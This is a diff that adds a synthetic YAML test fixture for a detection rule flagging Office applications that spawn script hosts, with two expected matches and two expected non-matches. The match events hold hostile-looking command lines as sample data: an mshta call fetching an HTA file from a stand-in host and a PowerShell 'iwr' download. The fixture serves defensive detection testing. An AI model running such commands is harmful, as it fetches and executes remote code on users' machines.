@@ -1,0 +1,91 @@
+# Positive (match) and negative (no_match) OCSF events for rules/ep-office-spawns-script.yml. Synthetic.
+rule: ep-office-spawns-script
+events:
+- expect: match
+  note: Word starts PowerShell
+  event:
+    class_uid: 1007
+    activity_id: 1
+    metadata:
+      uid: ep-off-p1
+      product:
+        name: Sysmon
+    process:
+      file:
+        path: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+      cmd_line: powershell.exe -c iwr
+      pid: 4120
+    actor:
+      process:
+        file:
+          path: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
+      user:
+        name: BWL\a.rivera
+    device:
+      hostname: BWL-WS-0142
+- expect: match
+  note: Excel starts mshta
+  event:
+    class_uid: 1007
+    activity_id: 1
+    metadata:
+      uid: ep-off-p2
+      product:
+        name: Sysmon
+    process:
+      file:
+        path: C:\Windows\System32\mshta.exe
+      cmd_line: mshta.exe http://login-verify.example/a.hta
+      pid: 4120
+    actor:
+      process:
+        file:
+          path: C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE
+      user:
+        name: BWL\a.rivera
+    device:
+      hostname: BWL-WS-0142
+- expect: no_match
+  note: Explorer starts PowerShell
+  event:
+    class_uid: 1007
+    activity_id: 1
+    metadata:
+      uid: ep-off-n1
+      product:
+        name: Sysmon
+    process:
+      file:
+        path: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+      cmd_line: powershell.exe
+      pid: 4120
+    actor:
+      process:
+        file:
+          path: C:\Windows\explorer.exe
+      user:
+        name: BWL\a.rivera
+    device:
+      hostname: BWL-WS-0142
+- expect: no_match
+  note: Word starts the print spooler helper
+  event:
+    class_uid: 1007
+    activity_id: 1
+    metadata:
+      uid: ep-off-n2
+      product:
+        name: Sysmon
+    process:
+      file:
+        path: C:\Windows\System32\splwow64.exe
+      cmd_line: splwow64.exe 8192
+      pid: 4120
+    actor:
+      process:
+        file:
+          path: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
+      user:
+        name: BWL\a.rivera
+    device:
+      hostname: BWL-WS-0142
